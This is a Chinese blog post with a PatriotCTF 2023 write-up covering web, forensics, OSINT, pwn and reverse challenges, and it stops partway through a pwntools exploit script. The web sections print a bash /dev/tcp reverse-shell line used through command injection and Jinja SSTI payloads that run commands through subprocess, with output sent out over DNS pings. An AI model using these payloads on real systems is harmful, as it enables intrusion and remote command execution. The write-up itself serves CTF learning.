<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PatriotCTF 2023 write up"><meta name="keywords" content="pwn,web,misc,write up"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>PatriotCTF 2023 write up | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scavenger-Hunt%EF%BC%88%E7%83%82%E6%B4%BB%EF%BC%8C%E4%BD%86%E6%98%AF%E6%98%AFbeginner%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">Scavenger Hunt（烂活，但是是beginner）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checkmate%EF%BC%88%E7%83%82%E6%B4%BB%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">Checkmate（烂活）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flower-Shop%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">Flower Shop（好活）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pick-Your-Starter%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">Pick Your Starter（好活）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#One-for-all%EF%BC%88%E7%A9%B6%E6%9E%81%E7%83%82%E6%B4%BB%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">One-for-all（究极烂活）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">2.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsupported-Format"><span class="toc-number">2.1.</span> <span class="toc-text">Unsupported Format</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Read-The-EULA%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">Read The EULA（好活）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Congratulations"><span class="toc-number">2.3.</span> <span class="toc-text">Congratulations</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rouge-Access-Point"><span class="toc-number">3.1.</span> <span class="toc-text">Rouge Access Point</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Satellite-Killer%EF%BC%88%E5%A5%BD%E6%B4%BB%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">Satellite Killer（好活）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#guessinggame"><span class="toc-number">4.1.</span> <span class="toc-text">guessinggame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printshop"><span class="toc-number">4.2.</span> <span class="toc-text">printshop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Coffee-Shop"><span class="toc-number">5.1.</span> <span class="toc-text">Coffee Shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patchwork"><span class="toc-number">5.2.</span> <span class="toc-text">Patchwork</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#garbage"><span class="toc-number">5.3.</span> <span class="toc-text">garbage</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">49</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">45</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">PatriotCTF 2023 write up</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-09-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>周六末比较无聊，跟舍友和实验室的同学找了个老外的比赛打打，把自己做出来的题写个wp然后骂骂出题人。</p>
<p><strong>总结：pwn是好活，但是👴🏻不会；取证是好活，但是👴🏻也不会；逆向是好活，但是👴🏻不会；开源情报是好活，但是👴🏻不会；web是烂活，但是👴🏻ak了，我只能说我是个傻逼。</strong></p>
<p>（注：每道题目都会标注是好活还是烂活，好活与烂活的唯一评判标准就是能否对未来比赛有用&amp;扩充知识&amp;巩固知识，所有的脑洞题根据出题人的虚无空间里的另外一个平行时空的🐴的寿命长短来判断烂活程度</p>
<p><img src="https://s2.loli.net/2023/09/11/WpUJxEv3b6AfyhH.png" alt=""></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Scavenger-Hunt（烂活，但是是beginner）"><a href="#Scavenger-Hunt（烂活，但是是beginner）" class="headerlink" title="Scavenger Hunt（烂活，但是是beginner）"></a>Scavenger Hunt（烂活，但是是beginner）</h2><p>找五部分flag，f12找到一堆，还有一个在robots.txt下面</p>
<h2 id="Checkmate（烂活）"><a href="#Checkmate（烂活）" class="headerlink" title="Checkmate（烂活）"></a>Checkmate（烂活）</h2><p><img src="https://s2.loli.net/2023/09/11/ufe2czMnmQRVF1d.png" alt=""></p>
<p>f12找到源码，输入用户名和密码，然后进行校验，然后下面提示check.php</p>
<p>逆向没啥难度，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_list = []</span><br><span class="line">or_list = []</span><br><span class="line">xor_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">        add_ = i &amp; j</span><br><span class="line">        or_ = i | j</span><br><span class="line">        xor_ = i ^ j</span><br><span class="line">        <span class="keyword">if</span> add_ == <span class="number">0x60</span>:</span><br><span class="line">            <span class="comment"># result[0] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[2] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;add:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            add_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="keyword">if</span> or_ == <span class="number">0x61</span>:</span><br><span class="line">            <span class="comment"># result[1] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[4] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;or:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            or_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="keyword">if</span> xor_ == <span class="number">0x6</span>:</span><br><span class="line">            <span class="comment"># result[3] = chr(i)</span></span><br><span class="line">            <span class="comment"># result[5] = chr(j)</span></span><br><span class="line">            print(<span class="string">&#x27;xor:&#x27;</span>, i, j, <span class="built_in">chr</span>(i), <span class="built_in">chr</span>(j))</span><br><span class="line">            xor_list.append(<span class="built_in">chr</span>(i)+ <span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(add_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(or_list)):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_list)):</span><br><span class="line">            result.append(add_list[i][<span class="number">0</span>] + or_list[j][<span class="number">0</span>] + add_list[i][<span class="number">1</span>] + xor_list[k][<span class="number">0</span>] + or_list[j][<span class="number">1</span>] + xor_list[k][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(result))</span><br><span class="line">result = [line+<span class="string">&quot;\n&quot;</span> <span class="keyword">for</span> line <span class="keyword">in</span> result]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(result)</span><br></pre></td></tr></table></figure>
<p>这题主要是不知道要干啥，check.php就是输入密码，然后没了，后来看出题人说，和名字有关</p>
<p><img src="https://s2.loli.net/2023/09/11/5MekqF2SITpUKvO.png" alt=""></p>
<p>4k次爆破，上面脚本跑出来的结果差不多就是三千多次，直接爆破就出了，纯纯烂活</p>
<p><img src="https://s2.loli.net/2023/09/11/eNRpkKrXTHiZLoP.png" alt=""></p>
<h2 id="Flower-Shop（好活）"><a href="#Flower-Shop（好活）" class="headerlink" title="Flower Shop（好活）"></a>Flower Shop（好活）</h2><p>给了源码，审计发现重置密码功能有问题，重置密码功能，提交到reset.inc.php中处理</p>
<p><img src="https://s2.loli.net/2023/09/11/Ka74UQRtIhejgk9.png" alt=""></p>
<p>reset.inc.php中调用了resetPassword方法</p>
<p><img src="https://s2.loli.net/2023/09/11/TeJUQ2BdFpanuot.png" alt=""></p>
<p>这里面有个exec，回溯下可以发现tmpPass不可控，但是wh是可控参数</p>
<p><img src="https://s2.loli.net/2023/09/11/tYsnRCbM8l3diaT.png" alt=""></p>
<p>wh在注册的时候会让你传入一个webhook链接，参数可控</p>
<p><img src="https://s2.loli.net/2023/09/11/unNyeg68JKHMpPx.png" alt=""></p>
<p>但是会进行一些过滤，主要是进行了filter_var的过滤：</p>
<p><img src="https://s2.loli.net/2023/09/11/3cxeTPmMqN5VIzh.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/nBzSdHKlsNOhmEZ.png" alt=""></p>
<p>参数可控，第二个filter_var没必要绕过，可以直接植入webhook链接，也可以用javascript伪协议来绕；第一个过滤空格，可以用${IFS}来绕</p>
<p>但是命令没回显，考虑反弹shell，在vps上建一个test.txt，内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>其中换上自己的公网ip，然后监听7777端口</p>
<p>payload如下：</p>
<p><img src="https://s2.loli.net/2023/09/11/LZx1ktoYuQTh94R.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/nCxH2eThRWcXFz7.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/No9CUphBfHnTzEu.png" alt=""></p>
<h2 id="Pick-Your-Starter（好活）"><a href="#Pick-Your-Starter（好活）" class="headerlink" title="Pick Your Starter（好活）"></a>Pick Your Starter（好活）</h2><p>给了如下页面</p>
<p><img src="https://s2.loli.net/2023/09/11/9IqKZfFpsA6oVl7.png" alt=""></p>
<p>测测可以发现是ssti</p>
<p><img src="https://s2.loli.net/2023/09/11/DEPakRhsZoO4NWc.png" alt=""></p>
<p>首先考虑带os的命令执行，但是手动fuzz了一波，发现了大致有如下黑名单：</p>
<blockquote>
<p>os</p>
<p>-</p>
<p>空格</p>
<p>[]</p>
<p>‘</p>
<p>“</p>
<p>builtins</p>
</blockquote>
<p>然后考虑用lazyFIle读一下文件，但最终失败了，然后考虑用subprocess.Process执行命令，先跑一下他的位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>, <span class="number">500</span>):</span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(&quot;</span>  + <span class="built_in">str</span>(i) +  <span class="string">&quot;)&#125;&#125;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://chal.pctf.competitivecyber.club:5555/&#x27;</span> + payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Flag 5/5=e4a541; PHPSESSID=1314a5d83fd38e1c6d3ebdf4a2873a68&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;subprocess&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>本来想用如下payload打</p>
<p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(455)(request.args.cmd,shell=True,stdout=-1).communicate().__getitem__(0).strip()&#125;&#125;&amp;cmd=ls</code></p>
<p>结果发现过滤了负号，想用~False来绕，结果500了，但是本地可以执行命令，不清楚远程什么情况，url编码也不彳亍，而且经过测试，没法用request.args和request.values来传参，命令无法执行，也不清楚什么情况（</p>
<p><img src="https://s2.loli.net/2023/09/11/ny843IzLX2mVSMO.png" alt=""></p>
<p>所以考虑不用stdout回显命令的执行结果，那么首先想到的就是反弹shell，但是参数的位置既不能get，又不能post来传，所以想到用cookie传。</p>
<p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(455)(request.cookies.a,shell=True).communicate()&#125;&#125;</code></p>
<p>当cookie传入sleep 5时，页面停止响应，证明可以执行命令。</p>
<p>但是经过测试，server端没有curl，nc之类的，bash -i 反弹shell也不管用。</p>
<p>那就考虑DNS外带，发现没有禁ping命令</p>
<p><img src="https://s2.loli.net/2023/09/11/7kDAqGPVEKCHwZi.png" alt=""></p>
<p>但是DNS外带的话，命令执行的结果很长就外带不了，所以只能猜测flag的位置，然后就猜中了，payload报文如下</p>
<p><img src="https://s2.loli.net/2023/09/11/DckWl7rpznstSNh.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/VzjwP613vMF4ob9.png" alt=""></p>
<h2 id="One-for-all（究极烂活）"><a href="#One-for-all（究极烂活）" class="headerlink" title="One-for-all（究极烂活）"></a>One-for-all（究极烂活）</h2><p>这么喜欢玩拼图要不要把你🐴给拼起来</p>
<p>四部分flag，完全没有任何逻辑，除了有一部分是sql注入，全靠摁猜，出题人还不让爆破，不爆破拿🔨猜</p>
<p>出题人用flask写的，按照找到flag的顺序来说，首先是最后一部分flag，有个profile页面，id传0才给最后一部分flag，别的传啥都是一个静态页面</p>
<p><img src="https://s2.loli.net/2023/09/11/o2WILqvrbHxk3nE.png" alt=""></p>
<p>然后第一部分flag是在主页里面把cookie改成admin获取flag</p>
<p>第三部分flag是sql注入，同时获得一个secret页面：</p>
<p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20230910143859539.png" alt=""></p>
<p>第二部分flag就在他给的secret路径相关，但是想了一下午，啥手法都试了都没有结果，然后dirsearch上大分：</p>
<p><img src="https://s2.loli.net/2023/09/11/6oSDtL4sHmyZqiX.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/y7fWeho8SUpYQrH.png"  /></p>
<p>我只能说究极烂活，然后比赛结束后开源了仓库，我寻思去看看咋写的代码吧，结果：</p>
<p><img src="https://s2.loli.net/2023/09/11/hTmrtiwZV1SAJGY.png" alt=""></p>
<p>你🐴④了</p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Unsupported-Format"><a href="#Unsupported-Format" class="headerlink" title="Unsupported Format"></a>Unsupported Format</h2><p>修jpg，找个在线网站一把🔐了，属于beginner</p>
<p><img src="https://s2.loli.net/2023/09/11/1E2ygbGxz69ritY.jpg" alt=""></p>
<h2 id="Read-The-EULA（好活）"><a href="#Read-The-EULA（好活）" class="headerlink" title="Read The EULA（好活）"></a>Read The EULA（好活）</h2><p>题目描述：</p>
<blockquote>
<p> My friend and I use to play Minecraft all the time together, but with recent updates he went off on some tangent about something called a Eula or something like that. Anyways, he said he found a new mining game he was testing but wouldn’t tell me the name of it. All he sent was a PCAP of him playing the game, saying he hid a flag in his movement… whatever that means.</p>
</blockquote>
<p>然后给了个流量包，一开始wireshark解析出来全部是UDP的流量，但是看起来似乎是一段用户自定义的协议</p>
<p>然后根据提示找minetest，发现是个类似于Minecraft的游戏引擎（？</p>
<p><a target="_blank" rel="noopener" href="https://github.com/minetest/minetest">https://github.com/minetest/minetest</a></p>
<p>然后翻了下目录，发现uilt/wireshark里面有个minetest.lua脚本，然后根据作者的table，发现第二部分是客户端的指令解析</p>
<p><img src="https://s2.loli.net/2023/09/11/n8KS6uCbzwkIQHc.png" alt=""></p>
<p>先甭管这么多，先把这个lua放到wireshark插件目录下面，尝试解析下流量，结果能识别特定的协议和字段了</p>
<p><img src="https://s2.loli.net/2023/09/11/4Rue79QMLDVZpSk.png" alt=""></p>
<p>然后去看他客户端的流量字段的解析规则，发现如下代码：</p>
<p><img src="https://s2.loli.net/2023/09/11/w3vWCVPkhtDG9Ts.png" alt=""></p>
<p>然后发现这个地方给出了用户移动的数据，尝试把pcapng数据包导出为json，然后写个脚本提取出所有的客户端的角色的移动数据（x，y，z）</p>
<p>发现y是个定值1500，所以提取出所有的（x，z），尝试绘制散点图，最终脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.animation <span class="keyword">import</span> FuncAnimation</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;data.json&#x27;</span></span><br><span class="line"></span><br><span class="line">json_data_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json_data_list = json.load(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">coordinates = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> json_data <span class="keyword">in</span> json_data_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        playerpos_x = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_x&quot;</span>]</span><br><span class="line">        playerpos_y = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_y&quot;</span>]</span><br><span class="line">        playerpos_z = json_data[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="string">&quot;minetest.client&quot;</span>][<span class="string">&quot;minetest.client.playerpos_z&quot;</span>]</span><br><span class="line"></span><br><span class="line">        coordinates.append(&#123;</span><br><span class="line">            <span class="string">&quot;x&quot;</span>: playerpos_x,</span><br><span class="line">            <span class="string">&quot;y&quot;</span>: playerpos_y,</span><br><span class="line">            <span class="string">&quot;z&quot;</span>: playerpos_z</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># print(coordinates)</span></span><br><span class="line"></span><br><span class="line">x_values = [<span class="built_in">int</span>(point[<span class="string">&#x27;x&#x27;</span>] * <span class="number">10</span>) <span class="keyword">for</span> point <span class="keyword">in</span> coordinates]	<span class="comment"># 放大x的值，要不然图会挤在一起</span></span><br><span class="line">z_values = [<span class="built_in">int</span>(point[<span class="string">&#x27;z&#x27;</span>]) <span class="keyword">for</span> point <span class="keyword">in</span> coordinates]</span><br><span class="line"></span><br><span class="line">plt.scatter(x_values, z_values, marker=<span class="string">&#x27;o&#x27;</span>, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/09/11/hszevpHMWa9oNLD.png" alt=""></p>
<h2 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h2><p>给了个word文档，里面嵌入VBA宏代码了，找到word的开发工具打开，flag就在x49变量里面</p>
<p><img src="https://s2.loli.net/2023/09/11/4KVEGexpBJCoTzA.png" alt=""></p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Rouge-Access-Point"><a href="#Rouge-Access-Point" class="headerlink" title="Rouge Access Point"></a>Rouge Access Point</h2><blockquote>
<p>We’ve received a notice from our companies EDR software that a laptop was attacked while they were on WFH. The employee says they were at home when it happened, but we suspect they were using public wifi. Our EDR software managed to capture the BSSID of the wifi (<strong>46:D1:FA:63:BC:66</strong>) network before it got disconnected, but not the SSID. Can you still find the network they were connected to?</p>
</blockquote>
<p>给了bssid，尝试找ssid，wigle数据库一查就查出来了</p>
<p><a target="_blank" rel="noopener" href="https://wigle.net/search#detailSearch?netid=46%3AD1%3AFA%3A63%3ABC%3A66">https://wigle.net/search#detailSearch?netid=46%3AD1%3AFA%3A63%3ABC%3A66</a></p>
<p><img src="https://s2.loli.net/2023/09/11/MWuLabS6T24vZ5h.png" alt=""></p>
<h2 id="Satellite-Killer（好活）"><a href="#Satellite-Killer（好活）" class="headerlink" title="Satellite Killer（好活）"></a>Satellite Killer（好活）</h2><p>题目描述：</p>
<blockquote>
<p><strong>Easy</strong></p>
<p>Most satellites get to live out a relatively peaceful existence in space until their orbit eventually decays and they fall back to Earth.</p>
<p>Most.</p>
<p>Back in the 80’s, one poor satellite met a premature end at the hands of an ASM-135.</p>
<p>I would like you to find the date that the second-to-last piece of its debris fell back down to Earth (Or more realistically, its decay date).</p>
<p>In addition, please give me its object ID/International Code.</p>
<p><em>Flag format: PCTF{OBJECTID_YEAR-MONTH-DAY} </em></p>
<p><em>For example, for a piece of debris from the Falcon 9, the flag would look like this: PCTF{2023-028BG_2023-3-15}</em></p>
</blockquote>
<p>尝试找一颗卫星的倒数第二碎片的坠落时间和编号，首先在维基上找到如下内容：</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Solwind">https://en.wikipedia.org/wiki/Solwind</a></p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Anti-satellite_weapon#cite_note-8">https://en.wikipedia.org/wiki/Anti-satellite_weapon#cite_note-8</a></p>
<p>然后给出了最后一块碎片的坠落时间，去查维基百科相关引用，可以找到一个卫星数据库，<a target="_blank" rel="noopener" href="https://www.space-track.org/。">https://www.space-track.org/。</a></p>
<p><img src="https://s2.loli.net/2023/09/11/843XoUJmydeLuVY.png" alt=""></p>
<p>这个web网站提供了调用的相关API，当然也可以手动翻几页，就能找到对应的数据：<a target="_blank" rel="noopener" href="https://www.space-track.org/basicspacedata/query/class/satcat/NORAD_CAT_ID/16085/format/html/emptyresult/show">https://www.space-track.org/basicspacedata/query/class/satcat/NORAD_CAT_ID/16085/format/html/emptyresult/show</a></p>
<p><img src="https://s2.loli.net/2023/09/11/Ydk5RyFOLowlCGb.png" alt=""></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>没咋做，难的不会，简单的又太简单</p>
<h2 id="guessinggame"><a href="#guessinggame" class="headerlink" title="guessinggame"></a>guessinggame</h2><p><img src="https://s2.loli.net/2023/09/11/rQ9ChceSXJxKg4E.png" alt=""></p>
<p>简单栈溢出，ret2text</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./guessinggame&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;chal.pctf.competitivecyber.club&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span 